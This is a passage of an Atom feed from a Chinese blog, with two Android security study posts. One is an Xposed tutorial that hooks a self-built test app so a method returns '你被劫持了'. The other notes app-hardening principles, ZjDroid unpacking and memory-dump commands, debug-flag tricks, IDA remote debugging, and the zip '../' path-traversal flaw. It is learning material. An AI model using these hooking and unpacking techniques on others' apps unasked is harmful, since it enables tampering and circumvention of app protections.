      <category term="安全" scheme="https://nuoye-blog.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="Frida" scheme="https://nuoye-blog.github.io/tags/Frida/"/>
    
      <category term="hook" scheme="https://nuoye-blog.github.io/tags/hook/"/>
    
  </entry>
  
  <entry>
    <title>Android-day14</title>
    <link href="https://nuoye-blog.github.io/2020/06/10/67e96b6d/"/>
    <id>https://nuoye-blog.github.io/2020/06/10/67e96b6d/</id>
    <published>2020-06-10T05:00:00.000Z</published>
    <updated>2020-06-10T13:49:39.989Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Xposed模块编写"><a href="#Xposed模块编写" class="headerlink" title="Xposed模块编写"></a>Xposed模块编写</h1><p>Xposed框架的原理：它部署在ROOT后的安卓手机上，通过替换/system/bin/app_process程序控制zygote进程，使得app_process在启动过程中会加载XposedBridge.jar这个jar包，从而完成对Zygote进程及其创建Dalvik虚拟机的劫持。</p><h2 id="编写步骤"><a href="#编写步骤" class="headerlink" title="编写步骤"></a>编写步骤</h2><h3 id="新建项目（xposedtry1）并编辑AndroidManifest-xml"><a href="#新建项目（xposedtry1）并编辑AndroidManifest-xml" class="headerlink" title="新建项目（xposedtry1）并编辑AndroidManifest.xml"></a>新建项目（xposedtry1）并编辑AndroidManifest.xml</h3><p>在<code>&lt;application&gt;</code>标签内添加：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">"xposedmodule"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:value</span>=<span class="string">"true"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">"xposeddescription"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:value</span>=<span class="string">"My First Xpoesd"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta-data</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:name</span>=<span class="string">"xposedminversion"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:value</span>=<span class="string">"53"</span> /&gt;</span></span><br></pre></td></tr></table></figure><h3 id="修改app下的build-gradle"><a href="#修改app下的build-gradle" class="headerlink" title="修改app下的build.gradle"></a>修改app下的build.gradle</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">repositories&#123;</span><br><span class="line">    jcenter()</span><br><span class="line">&#125;</span><br><span class="line">dependencies &#123;</span><br><span class="line">    compileOnly &#39;de.robv.android.xposed:api:82&#39;</span><br><span class="line">    compileOnly &#39;de.robv.android.xposed:api:82:sources&#39;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><h3 id="新建一项目（xposedtest）作为靶场"><a href="#新建一项目（xposedtest）作为靶场" class="headerlink" title="新建一项目（xposedtest）作为靶场"></a>新建一项目（xposedtest）作为靶场</h3><p>添加按钮，并且修改MainActivity代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        Button check = (Button) findViewById(R.id.check);</span><br><span class="line">        check.setOnClickListener(<span class="keyword">new</span> View.OnClickListener()&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span></span>&#123;</span><br><span class="line">                Toast.makeText(MainActivity.<span class="keyword">this</span>, toastmsg(), Toast.LENGTH_LONG).show();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">toastmsg</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我未被劫持"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="回到xposedtry1项目中新建类HOOK-function"><a href="#回到xposedtry1项目中新建类HOOK-function" class="headerlink" title="回到xposedtry1项目中新建类HOOK_function"></a>回到xposedtry1项目中新建类HOOK_function</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.xposedtry1;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XC_MethodHook;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedBridge;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.XposedHelpers;</span><br><span class="line"><span class="keyword">import</span> de.robv.android.xposed.callbacks.XC_LoadPackage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HOOK_function</span> <span class="keyword">implements</span> <span class="title">IXposedHookLoadPackage</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleLoadPackage</span><span class="params">(XC_LoadPackage.LoadPackageParam loadPackageParam)</span> <span class="keyword">throws</span> Throwable</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(loadPackageParam.packageName.equals(<span class="string">"com.example.xposedtest"</span>))&#123;</span><br><span class="line">            XposedBridge.log(<span class="string">"has Hooked!"</span>);</span><br><span class="line">            Class clazz = loadPackageParam.classLoader.loadClass(<span class="string">"com.example.xposedtest.MainActivity"</span>);</span><br><span class="line">            XposedHelpers.findAndHookMethod(clazz, <span class="string">"toastmsg"</span>, <span class="keyword">new</span> XC_MethodHook() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">beforeHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable</span>&#123;</span><br><span class="line">                    <span class="keyword">super</span>.beforeHookedMethod(param);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">afterHookedMethod</span><span class="params">(MethodHookParam param)</span> <span class="keyword">throws</span> Throwable</span>&#123;</span><br><span class="line">                    param.setResult(<span class="string">"你被劫持了"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="添加入口点"><a href="#添加入口点" class="headerlink" title="添加入口点"></a>添加入口点</h3><p>new-&gt;Folder-&gt;Assets Folder新建assets文件夹，新建xposed_init文件（text类型），写入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">com.example.xposedtry1.HOOK_function</span><br></pre></td></tr></table></figure><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>直接在编译器里将app安装上去，然后xposed中勾上，重启即可看到效果。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>新手不要再被误导！这是一篇最新的Xposed模块编写教程 - FreeBuf互联网安全新媒体平台  <a href="https://www.freebuf.com/articles/terminal/189021.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/terminal/189021.html</a></p><p>Xposed Framework API  <a href="https://api.xposed.info/reference/packages.html" target="_blank" rel="noopener">https://api.xposed.info/reference/packages.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Xposed模块编写&quot;&gt;&lt;a href=&quot;#Xposed模块编写&quot; class=&quot;headerlink&quot; title=&quot;Xposed模块编写&quot;&gt;&lt;/a&gt;Xposed模块编写&lt;/h1&gt;&lt;p&gt;Xposed框架的原理：它部署在ROOT后的安卓手机上，通过替换/syste
      
    
    </summary>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/tags/Android/"/>
    
      <category term="开发" scheme="https://nuoye-blog.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
      <category term="安全" scheme="https://nuoye-blog.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
      <category term="hook" scheme="https://nuoye-blog.github.io/tags/hook/"/>
    
      <category term="xposed" scheme="https://nuoye-blog.github.io/tags/xposed/"/>
    
  </entry>
  
  <entry>
    <title>Android-day13</title>
    <link href="https://nuoye-blog.github.io/2020/06/09/f98dfece/"/>
    <id>https://nuoye-blog.github.io/2020/06/09/f98dfece/</id>
    <published>2020-06-09T07:30:00.000Z</published>
    <updated>2020-06-10T13:49:40.013Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Android应用加固原理"><a href="#Android应用加固原理" class="headerlink" title="Android应用加固原理"></a>Android应用加固原理</h1><h2 id="加固原理解析"><a href="#加固原理解析" class="headerlink" title="加固原理解析"></a>加固原理解析</h2><p>加固的过程需要三个对象：</p><p>需要加密的apk（源apk）</p><p>自己的壳程序apk（负责解密apk工作）</p><p>加密工具（将源apk进行加密和壳dex合并成新的dex）</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="./day13/1.jpg" alt=""></p><p>加固的主要步骤：拿到需要加密的apk和自己的壳程序apk，然后用加密算法对源apk进行加密，再将壳apk进行合并得到新的dex文件，最后替换壳程序中的dex文件即可，得到新的apk，这个新的apk也叫做脱壳程序apk（它的主要工作是解密源apk，然后加载apk，让其正常运行起来）。</p><p>常用反编译工具：jd-gui、dex2jar。</p><h1 id="Android中的so加固原理"><a href="#Android中的so加固原理" class="headerlink" title="Android中的so加固原理"></a>Android中的so加固原理</h1><h2 id="基于对so中section加密实现so加固"><a href="#基于对so中section加密实现so加固" class="headerlink" title="基于对so中section加密实现so加固"></a>基于对so中section加密实现so加固</h2><h3 id="技术原理"><a href="#技术原理" class="headerlink" title="技术原理"></a>技术原理</h3><p>加密过程：找到so文件中一个section的起始地址和大小就可以对这个section进行加密了。</p><p>解密过程：对于一个so文件，当被加载到程序后，可以使用<code>__attrbute__((constructor));</code>这个属性（这个属性优先于main方法之前执行，类似java中的构造函数，C++的构造函数即是基于这个属性实现的）。</p><h2 id="基于对so中的函数加密实现so加固"><a href="#基于对so中的函数加密实现so加固" class="headerlink" title="基于对so中的函数加密实现so加固"></a>基于对so中的函数加密实现so加固</h2><h1 id="Android逆向分析基础"><a href="#Android逆向分析基础" class="headerlink" title="Android逆向分析基础"></a>Android逆向分析基础</h1><h2 id="逆向工具"><a href="#逆向工具" class="headerlink" title="逆向工具"></a>逆向工具</h2><ul><li>apktool</li><li>dex2jar+jd-gui</li><li>JEB和Jadx</li><li>Xposed</li><li>Cydia Substrate</li><li>ZjDroid</li><li>IDA</li></ul><h2 id="打开系统调试总开关"><a href="#打开系统调试总开关" class="headerlink" title="打开系统调试总开关"></a>打开系统调试总开关</h2><p>Android中一些常用的配置信息都存放在/system/build.prop文件中。</p><p>通过使用getprop和setprop命令，可以获取和设置这些属性，另外ro开头的属性是不允许后期修改的。</p><p>而/system/defult.prop中的ro.debuggable（当Dalvik虚拟机从Android应用框架中启动时，这个值为1）这个值如果为1，那么系统中所有的程序都是可以调试的。如果该值为0，则会判断程序AndroidManifest.xml中android:debuggable元素是否为true，如果为true则开启调试支持。</p><p>设置ro.debuggable的三种方式：</p><ul><li>直接修改default.prop文件中的值，然后重启设备。</li><li>改写系统文件，重新编译系统镜像文件，然后刷入到设备中。</li><li>注入init进程，修改内存中的属性值。</li></ul><p>网上已有最后一种方式（最稳定）的实现工具mprop</p><h1 id="反编译神器apktool和Jadx"><a href="#反编译神器apktool和Jadx" class="headerlink" title="反编译神器apktool和Jadx"></a>反编译神器apktool和Jadx</h1><h2 id="分析apktool的源码"><a href="#分析apktool的源码" class="headerlink" title="分析apktool的源码"></a>分析apktool的源码</h2><p>源码地址为<a href="https://code.google.com/p/android-apktool/。github的地址：https://github.com/iBotPeaches/Apktool。" target="_blank" rel="noopener">https://code.google.com/p/android-apktool/。github的地址：https://github.com/iBotPeaches/Apktool。</a></p><h2 id="Jadx源码分析"><a href="#Jadx源码分析" class="headerlink" title="Jadx源码分析"></a>Jadx源码分析</h2><p>源码地址：<a href="https://github.com/skylot/jadx。" target="_blank" rel="noopener">https://github.com/skylot/jadx。</a></p><h1 id="HOOK神器Xposed"><a href="#HOOK神器Xposed" class="headerlink" title="HOOK神器Xposed"></a>HOOK神器Xposed</h1><h2 id="编写模块功能"><a href="#编写模块功能" class="headerlink" title="编写模块功能"></a>编写模块功能</h2><p>暂略，后面争取开一章学习</p><h1 id="脱壳神器ZjDroid"><a href="#脱壳神器ZjDroid" class="headerlink" title="脱壳神器ZjDroid"></a>脱壳神器ZjDroid</h1><p>源码地址：<a href="http://github.com/halfkiss/ZjDroid" target="_blank" rel="noopener">http://github.com/halfkiss/ZjDroid</a></p><h2 id="工具命令"><a href="#工具命令" class="headerlink" title="工具命令"></a>工具命令</h2><h3 id="dump-dexinfo"><a href="#dump-dexinfo" class="headerlink" title="dump_dexinfo"></a>dump_dexinfo</h3><p>用于获取应用运行时内存中的dex信息。对应函数为DumpDexInfoCommandHandler。</p><p>用法<code>am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;(&quot;action&quot;:&quot;dump_dexinfo&quot;)&#39;</code></p><h3 id="dump-dexfile"><a href="#dump-dexfile" class="headerlink" title="dump_dexfile"></a>dump_dexfile</h3><p>用于dump出应用内存中dex文件。对应函数为DumpDexFileCommandHandler。</p><p>用法：<code>am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;(&quot;action&quot;:&quot;dump_dexfile&quot;, &quot;dexpath&quot;:&quot;*****&quot;)&#39;</code></p><p>其中dexpath参数代表需要脱壳的dex文件，也就是应用程序文件。</p><p>脱壳后的文件在/data/data/xxx/files/dexdump.odex</p><h3 id="backsmali"><a href="#backsmali" class="headerlink" title="backsmali"></a>backsmali</h3><p>该命令与上一命令功能差不多，只不过还增加了把dex文件转化为smali文件的功能。</p><p>命令：<code>am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;(&quot;action&quot;:&quot;backsmali&quot;, &quot;dexpath&quot;:&quot;*****&quot;)&#39;</code></p><p>最终生成文件在/data/data/xxx/smali下。</p><h3 id="dump-mem"><a href="#dump-mem" class="headerlink" title="dump_mem"></a>dump_mem</h3><p>这个命令用来dump出应用程序运行时内存中指定开始位置和长度的内存块数据的。对应函数DumpMemCommandHandler。</p><p>命令：<code>am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;(&quot;action&quot;:&quot;dump_mem&quot;, &quot;start&quot;:111, &quot;length&quot;:222)&#39;</code></p><p>其中start和length都是十进制。</p><h3 id="dump-heap"><a href="#dump-heap" class="headerlink" title="dump_heap"></a>dump_heap</h3><p>该命令用于dump出虚拟机的堆内存信息，可以用于java heap工具分析。</p><p>命令：<code>am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;(&quot;action&quot;:&quot;dump_heap&quot;)&#39;</code></p><h3 id="dump-class"><a href="#dump-class" class="headerlink" title="dump_class"></a>dump_class</h3><p>这个命令主要用于dump出dex文件中的类信息。因为在DexFile对象中有一个隐藏的方法可以把dex文件中所有类名获取到getClassNameList。</p><p>命令：<code>am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;(&quot;action&quot;:&quot;dump_heap&quot;, &quot;dexpath&quot;:&quot;*****&quot;)&#39;</code></p><h3 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h3><p>这个命令用于运行时动态调用Lua脚本，该功能可以通过Lia脚本动态调用Java代码。</p><p>命令：<code>am broadcast -a com.zjdroid.invoke --ei target [pid] --es cmd &#39;(&quot;action&quot;:&quot;invoke&quot;, &quot;filepath&quot;:&quot;*****&quot;)&#39;</code></p><h2 id="工具日志信息"><a href="#工具日志信息" class="headerlink" title="工具日志信息"></a>工具日志信息</h2><p>两个tag可以用于查看相应日志：</p><p>zjdroid-shell-{package name}：该tag可以查看上面每个命令执行的结果，便于查看命令执行状态。</p><p>zjdroid-apimonitor-{package name}：该tag可以监听对应包名应用调用的API信息，类似于运行时权限请求。</p><h1 id="Native层Hook神奇Cydia-Substrate"><a href="#Native层Hook神奇Cydia-Substrate" class="headerlink" title="Native层Hook神奇Cydia Substrate"></a>Native层Hook神奇Cydia Substrate</h1><p><a href="http://www.cydiasubstrate.com" target="_blank" rel="noopener">http://www.cydiasubstrate.com</a></p><p>略，有机会再尝试。</p><h1 id="静态方式逆向应用"><a href="#静态方式逆向应用" class="headerlink" title="静态方式逆向应用"></a>静态方式逆向应用</h1><h3 id="smali语法"><a href="#smali语法" class="headerlink" title="smali语法"></a>smali语法</h3><h3 id="手动注入smali语句"><a href="#手动注入smali语句" class="headerlink" title="手动注入smali语句"></a>手动注入smali语句</h3><h3 id="ARM指令"><a href="#ARM指令" class="headerlink" title="ARM指令"></a>ARM指令</h3><h1 id="动态调试smali源码"><a href="#动态调试smali源码" class="headerlink" title="动态调试smali源码"></a>动态调试smali源码</h1><p>步骤：</p><ol><li>建议apk：修改debug属性为true，同时加上waitForDebug，从而允许调试</li><li>回编译apk：回编译并签名、安装</li><li>将反编译samli工程导入Eclipse</li><li>设置远程调试</li><li>调试apk程序</li><li>编写代码实现核心逻辑</li></ol><p>jeb也有调试功能，只需要加载app，然后在adb中运行<code>am start -n [packagename]/[packagename].[Activity] -D</code>即可attach上去。</p><h1 id="IDA调试so源码"><a href="#IDA调试so源码" class="headerlink" title="IDA调试so源码"></a>IDA调试so源码</h1><h3 id="获取android-server"><a href="#获取android-server" class="headerlink" title="获取android_server"></a>获取android_server</h3><p>在IDA目录下/dbgsrv/android/server。将该文件移动到设备目录/data下，接着运行，这样就打开了监听设备的端口（这里以23946端口为例，可以通过-p参数修改端口）。</p><p>然后运行adb命令：<code>adb forward tcp:远程设备端口 tcp:本地端口</code>，即可以写成<code>adb forward tcp:23946 tcp:23946</code>。</p><h3 id="IDA获取进程信息"><a href="#IDA获取进程信息" class="headerlink" title="IDA获取进程信息"></a>IDA获取进程信息</h3><p>打开IDA，在Debugger中选择Android debugger选项，然后attach上去（127.0.0.1:23946）。</p><h3 id="找到函数地址下断点"><a href="#找到函数地址下断点" class="headerlink" title="找到函数地址下断点"></a>找到函数地址下断点</h3><p>到这里就跟平时elf调试差不多了，略过</p><h1 id="Android中常见漏洞分析"><a href="#Android中常见漏洞分析" class="headerlink" title="Android中常见漏洞分析"></a>Android中常见漏洞分析</h1><h2 id="解压文件漏洞分析"><a href="#解压文件漏洞分析" class="headerlink" title="解压文件漏洞分析"></a>解压文件漏洞分析</h2><p>因为ZipEntry对传入的文件名没有限制，导致可以使用<code>../</code>等字符从而随意覆盖本地文件。</p><h2 id="录屏授权漏洞分析"><a href="#录屏授权漏洞分析" class="headerlink" title="录屏授权漏洞分析"></a>录屏授权漏洞分析</h2><p>由于提示信息展示的时候没有做省略处理，从而把最重要的提示文案隐藏，导致用户被骗，同意授权。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Android应用加固原理&quot;&gt;&lt;a href=&quot;#Android应用加固原理&quot; class=&quot;headerlink&quot; title=&quot;Android应用加固原理&quot;&gt;&lt;/a&gt;Android应用加固原理&lt;/h1&gt;&lt;h2 id=&quot;加固原理解析&quot;&gt;&lt;a href=&quot;#加固原
      
    
    </summary>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/tags/Android/"/>
    
      <category term="开发" scheme="https://nuoye-blog.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
      <category term="安全" scheme="https://nuoye-blog.github.io/tags/%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
